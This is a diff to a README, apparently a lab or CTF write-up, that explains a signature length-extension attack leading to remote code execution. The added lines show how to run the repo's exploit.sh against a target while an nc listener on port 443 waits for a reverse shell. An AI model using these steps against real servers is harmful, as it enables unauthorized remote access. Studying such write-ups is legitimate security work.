@@ -62,7 +62,14 @@ The signature of the append_payload can be calcualted by pushing the new data in
 
 ### Step (3): Customize the append_payload. The append_payload POSTed to the serve contains the ini_payload, the PADDING of ini_payload, and the new command. We do not include the 8 byte SIZE_DATA since the server will calculate the final size of append_payload itself.
 
-### Step (4): With the new signature and the append_payload, we can then send those in JSON format by POST method to the server to trigger RCE. There is an example exploit written in bash and C in this repo.
+### Step (4): With the new signature and the append_payload, we can then send those in JSON format by POST method to the server to trigger RCE. There is an example exploit.sh written in bash and C in this repo.
+```
+chmod +x exploit.sh
+
+nc -nvlp 443
+
+./exploit.sh 192.168.207.153 8000 192.168.49.207 443
+```
 
 
 
